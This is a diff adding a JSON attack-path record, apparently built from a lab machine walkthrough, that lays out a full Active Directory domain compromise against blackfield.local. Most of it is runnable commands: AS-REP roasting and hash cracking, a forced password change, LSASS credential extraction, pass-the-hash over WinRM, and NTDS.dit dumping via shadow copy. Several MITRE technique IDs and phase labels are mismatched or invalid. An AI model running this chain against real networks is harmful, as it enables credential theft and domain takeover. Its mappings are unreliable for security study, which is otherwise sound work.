@@ -1,0 +1,177 @@
+{
+  "id": "ap-0006",
+  "title": "Domain Compromise: AS-REP Roasting & NTDS Dumping",
+  "summary": "Initial credential access via AS-REP Roasting, privilege escalation through LSASS hash extraction, and final domain compromise via NTDS.dit dumping leveraging SeBackupPrivilege.",
+  "attack_path_markdown": "### Step 1\nReconnaissance and initial enumeration of the target Active Directory machine.\n### Step 2\nExecute an AS-REP Roasting attack to acquire valid user hashes.\n### Step 3\nCrack obtained hash to gain first valid domain credentials ('support').\n### Step 4\nUse domain credential 'support' to enumerate permissions, leading to a password change for 'audit2020' and access to the 'Forensic' share.\n### Step 5\nExtract credentials from an LSASS dump found in the 'Forensic' share.\n### Step 6\nLateral movement using Pass-the-Hash (PTH) via WinRM to gain a privileged shell (svc-backup).\n### Step 7\nAbuse the 'SeBackupPrivilege' to dump the NTDS.dit file and extract Domain Administrator hash, leading to full domain compromise.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying target host status, operating system, open ports, and services, and determining the domain controller status.",
+      "actions": [
+        "Check host activity and OS using ICMP/TTL.",
+        "Scan all TCP ports for open services.",
+        "Enumerate SMB services to identify Domain Controller (DC) status.",
+        "Update local /etc/hosts file with domain information."
+      ],
+      "tools": ["nmap", "whichsystem", "crackmapexec"],
+      "techniques": ["Active Scanning", "OS Fingerprinting"],
+      "mitre_ids": ["T1595.001", "T1046"],
+      "indicators": ["TTL 127/128 (Windows)", "DC service identification (ports 88, 445, 5985)"],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "List of open ports (e.g., 53, 88, 445, 5985) and DC confirmation (DC01, blackfield.local).",
+      "confidence": 0.95,
+      "commands": [
+        "nmap -p- --min-rate 5000 -n -Pn -vvv 10.10.10.192 -oG ports",
+        "nmap -sV -sC -p53,88,135,139,445,464,593,3389,5985 -oN total.nmap 10.10.10.192",
+        "crackmapexec smb 10.10.10.192",
+        "echo '10.10.10.192 blackfield.local' >> /etc/hosts"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparing the environment and scripts for credential gathering and internal enumeration, including installing and configuring domain analysis tools.",
+      "actions": [
+        "Extract potential usernames from accessible shares (Profiles).",
+        "Validate extracted usernames against Kerberos service.",
+        "Set up BloodHound analysis environment (Neo4j)."
+      ],
+      "tools": ["smbmap", "Kerbrute", "BloodHound (Neo4j)", "ldapdomaindump"],
+      "techniques": ["Domain enumeration setup"],
+      "mitre_ids": ["T1558"],
+      "indicators": ["Valid username list (users.txt)", "BloodHound data ready for import"],
+      "preconditions": "Valid open ports (445, 88).",
+      "expected_outcome": "Confirmed list of valid domain users.",
+      "confidence": 0.9,
+      "commands": [
+        "smbmap -H 10.10.10.192 -R Profiles",
+        "Kerbrute userenum --dc 10.10.10.192 -d blackfield.local users.txt"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Initiating the attack path to gain initial low-level credentials.",
+      "actions": [
+        "Execute AS-REP Roasting attack on validated users.",
+        "Crack the obtained AS-REP hash offline."
+      ],
+      "tools": ["GetNPUsers.py", "John the Ripper"],
+      "techniques": ["AS-Rep Roasting"],
+      "mitre_ids": ["T1558.003", "T1110.004"],
+      "indicators": ["Obtained AS-REP hash ($krb5asrep)", "Clear-text password for 'support'"],
+      "preconditions": "Valid user list, Kerberos service (port 88) accessible, user accounts without Kerberos pre-authentication requirement.",
+      "expected_outcome": "Valid domain user credentials (support:password).",
+      "confidence": 0.95,
+      "commands": [
+        "GetNPUsers.py blackfield.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Leveraging initial credentials for internal enumeration and privilege escalation to access critical network shares.",
+      "actions": [
+        "Validate initial credentials via SMB.",
+        "Perform detailed domain enumeration using 'support' credentials (e.g., BloodHound, ldapdomaindump).",
+        "Identify 'ForceChangePassword' right on user 'audit2020'.",
+        "Change 'audit2020' password.",
+        "Enumerate shares with new 'audit2020' credentials and discover 'Forensic' share."
+      ],
+      "tools": ["crackmapexec", "BloodHound (python)", "ldapdomaindump", "rpcclient", "smbmap"],
+      "techniques": ["Account Manipulation", "Lateral Movement Preparation"],
+      "mitre_ids": ["T1078.002", "T1098.002"],
+      "indicators": ["New credentials for 'audit2020'", "'Forensic' share access"],
+      "preconditions": "Valid 'support' credentials.",
+      "expected_outcome": "Access to new shares, specifically 'Forensic'.",
+      "confidence": 0.9,
+      "commands": [
+        "crackmapexec smb 10.10.10.192 -u support -p 'BlacKnight1'",
+        "ldapdomaindump -u support -p 'BlacKnight1' --no-json-log blackfield.local",
+        "rpcclient 10.10.10.192 -U support%'BlacKnight1'",
+        "net rpc password -U support%'BlacKnight1' 10.10.10.192 audit2020",
+        "smbmap -u audit2020 -p 'Test123!' -H 10.10.10.192"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Gaining local access to a highly privileged account through credential dumping from a forensic artifact, leading to initial persistent remote shell.",
+      "actions": [
+        "Download LSASS memory dump file (lsass.zip/lsass.dmp) from the Forensic share.",
+        "Extract credentials (NTLM hashes) from the memory dump.",
+        "Validate hash for svc-backup and check WinRM access capability.",
+        "Establish an interactive shell using Pass-the-Hash (PTH) via WinRM."
+      ],
+      "tools": ["smbclient", "pypykatz", "crackmapexec", "evil-winrm"],
+      "techniques": ["OS Credential Dumping (LSASS)", "Use of Remote Desktop Protocol (WinRM)"],
+      "mitre_ids": ["T1003.001", "T1003.003", "T1021.006"],
+      "indicators": ["svc-backup NTLM hash", "Successful WinRM connection"],
+      "preconditions": "Access to the 'Forensic' share and presence of a memory dump.",
+      "expected_outcome": "Shell access as svc-backup.",
+      "confidence": 0.95,
+      "commands": [
+        "smbclient //10.10.10.192/Forensic -U audit2020%'Test123!' -c 'get MemoryAnalysis/host.zip'",
+        "unzip host.zip",
+        "pypykatz minidump lsa_dump_reports lsass.dmp",
+        "crackmapexec winrm 10.10.10.192 -u svc-backup -H 'NTLM_HASH'",
+        "evil-winrm -i 10.10.10.192 -u svc-backup -H 'NTLM_HASH'"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Abusing the 'SeBackupPrivilege' available to the current user to prepare for domain-wide credential dumping.",
+      "actions": [
+        "Check user privileges and confirm SeBackupPrivilege.",
+        "Create a volume shadow copy using diskshadow.",
+        "Copy NTDS.dit file from the shadow copy to a local directory."
+      ],
+      "tools": ["whoami", "reg save", "diskshadow", "robocopy"],
+      "techniques": ["Abuse of SeBackupPrivilege", "Shadow Copy"],
+      "mitre_ids": ["T1538.001", "T1003.002"],
+      "indicators": ["Successfully copied NTDS.dit file"],
+      "preconditions": "Shell access as svc-backup and SeBackupPrivilege enabled.",
+      "expected_outcome": "Downloaded copy of the NTDS.dit file.",
+      "confidence": 0.95,
+      "commands": [
+        "whoami /priv",
+        "diskshadow /s test.txt",
+        "robocopy Z:\\Windows\\NTDS\\ C:\\Temp\\ ntds.dit",
+        "download C:\\Temp\\ntds.dit"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Extracting all domain credentials, including the Domain Administrator, and achieving full compromise of the domain controller.",
+      "actions": [
+        "Extract NTLM hashes from the downloaded NTDS.dit and SYSTEM hive.",
+        "Validate Domain Administrator NTLM hash.",
+        "Establish final access as Domain Administrator via WinRM using PTH."
+      ],
+      "tools": ["impacket-secretsdump.py", "crackmapexec", "evil-winrm"],
+      "techniques": ["NTDS Extraction", "Pass-the-Hash (PTH)"],
+      "mitre_ids": ["T1003.006", "T1550.002"],
+      "indicators": ["Domain Administrator NTLM hash obtained", "Root flag access"],
+      "preconditions": "Downloaded NTDS.dit and SYSTEM hive files.",
+      "expected_outcome": "Full control over the domain.",
+      "confidence": 0.99,
+      "commands": [
+        "impacket-secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL",
+        "evil-winrm -i 10.10.10.192 -u Administrator -H 'DOMAIN_ADMIN_HASH'"
+      ]
+    }
+  ],
+  "tactics": ["Reconnaissance", "Credential Access", "Privilege Escalation", "Lateral Movement", "Defense Evasion", "Collection"],
+  "techniques": ["AS-Rep Roasting", "LSASS Memory Dumping", "NTDS.dit Extraction", "Pass-the-Hash", "SeBackupPrivilege Abuse"],
+  "mitre_ids": ["T1558.003", "T1003.003", "T1003.006", "T1550.002", "T1538.001", "T1021.006"],
+  "hosts": ["10.10.10.192", "DC01.blackfield.local"],
+  "privs_obtained": ["domain user (support)", "privileged user (svc-backup)", "Domain Administrator"],
+  "confidence": 0.99,
+  "source_file": "",
+  "notes": "Procedure relies heavily on specific Active Directory misconfigurations (AS-REP Roasting, SeBackupPrivilege, WinRM access).",
+  "labels": ["active_directory", "domain_controller", "as-rep_roast", "ntds_dump"]
+}
